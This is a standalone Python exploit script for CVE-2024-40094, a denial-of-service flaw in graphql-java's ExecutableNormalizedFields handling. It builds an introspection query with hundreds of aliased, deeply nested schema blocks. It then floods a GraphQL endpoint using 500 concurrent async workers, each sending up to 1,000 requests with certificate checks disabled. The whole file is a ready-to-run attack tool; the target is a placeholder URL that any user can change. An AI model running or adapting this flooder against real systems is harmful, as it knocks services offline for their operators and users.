# CVE-2024-40094 exploit
# ExecutableNormalizedFields (ENF)

import asyncio
import aiohttp
import time
import urllib3

# Disable SSL verification warnings if using self-signed certificates
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

# Set the target URL
URL = "https://api.example.com/graphql"

# Set the request headers
HEADERS = {
    "Host": "api.example.com",
    "Authorization": "Bearer <token>"
}

# Number of concurrent jobs (similar to threads)
# Each job will be a coroutine
JOB_COUNT = 500

# Number of repeated alias blocks in the query (depth of stress on the server)
ALIAS_COUNT = 500

# Delay between requests (in seconds)
REQUEST_DELAY = 0.0

# Maximum number of requests each job sends (for clean shutdown)
# Set to None for an unlimited number of requests
MAX_REQUESTS_PER_JOB = 1000

# Optional log file for recording outputs
LOG_FILE = "enf_attack_async.log"

def build_enf_query(alias_count=15):
    """
    Build a large introspection-based query with repeated aliases
    to potentially trigger ENF-based denial of service in vulnerable graphql-java.
    We'll nest ~5-7 levels, but you can push it deeper if needed.
    """
    nested_block = """
      __schema {
        types {
          name
          fields {
            name
            type {
              name
              fields {
                name
                type {
                  name
                  fields {
                    name
                  }
                }
              }
            }
          }
        }
      }
    """
    alias_parts = []
    for i in range(1, alias_count + 1):
        alias_parts.append(f"alias{i}:{nested_block}")

    return f"""
    query ENF_Exploit {{
       {''.join(alias_parts)}
    }}
    """

async def worker(session: aiohttp.ClientSession, worker_id: int):
    """
    An asynchronous job that sends sequential requests to the server
    until it reaches the MAX_REQUESTS_PER_JOB limit or the program is stopped.
    """
    requests_sent = 0
    while True:
        # If we have a maximum request limit, stop once it's reached
        if MAX_REQUESTS_PER_JOB is not None and requests_sent >= MAX_REQUESTS_PER_JOB:
            print(f"[Worker-{worker_id}] Max requests reached. Stopping...")
            break

        query = build_enf_query(ALIAS_COUNT)
        start_time = time.time()
        try:
            # Send the request
            async with session.post(URL, data=query, ssl=False) as resp:
                status_code = resp.status
                text = await resp.text()
                length_resp = len(text)
                snippet = text[:200].replace('\n', ' ')
                elapsed = time.time() - start_time

                msg = (f"[Worker-{worker_id}] Status: {status_code}, Len: {length_resp}, "
                       f"Time: {elapsed:.2f}s, Snippet: {snippet}...")
                print(msg)

                # Optionally log to a file
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write(msg + "\n")

        except Exception as e:
            error_msg = f"[Worker-{worker_id}] Error: {e}"
            print(error_msg)
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(error_msg + "\n")
            break

        requests_sent += 1
        if REQUEST_DELAY > 0:
            await asyncio.sleep(REQUEST_DELAY)


async def main():
    """
    Launch all jobs (as coroutines),
    then wait for all jobs to complete.
    """
    # It's recommended to use a single ClientSession
    # for optimized connection pooling
    async with aiohttp.ClientSession(headers=HEADERS) as session:
        tasks = []
        for i in range(JOB_COUNT):
            tasks.append(asyncio.create_task(worker(session, i)))

        # Wait for all tasks to complete
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("KeyboardInterrupt received. Shutting down...")
